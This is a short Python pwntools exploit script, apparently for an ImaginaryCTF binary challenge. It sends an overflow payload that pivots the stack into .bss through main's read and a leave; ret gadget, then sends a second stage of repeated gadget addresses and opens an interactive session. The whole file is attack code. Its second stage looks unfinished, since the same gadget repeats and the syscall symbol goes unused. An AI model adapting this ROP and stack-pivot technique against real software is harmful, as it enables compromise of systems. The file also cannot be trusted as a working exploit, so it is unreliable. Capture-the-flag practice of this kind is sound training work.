#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./vuln")


def start(argv=[], *a, **kw):
    host = args.HOST or 'ret2win.chal.imaginaryctf.org'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

pad = 0x8
syscall = elf.symbols["syscall"]
read = elf.symbols["main"] + 12
leave_ret = elf.symbols["main"] + 49
pop_rbp = 0x0040111d
fak = 0x0040106d
kaf = 0x4010c5

payload = b"A" * pad
payload += p64(elf.bss(0x100))
payload += flat(read)
payload += flat(leave_ret)

pause()
io.send(payload)

payload = b""
payload += flat(kaf)
payload += flat(kaf)
payload += flat(kaf)
payload += flat(kaf)
io.send(payload)

io.interactive()
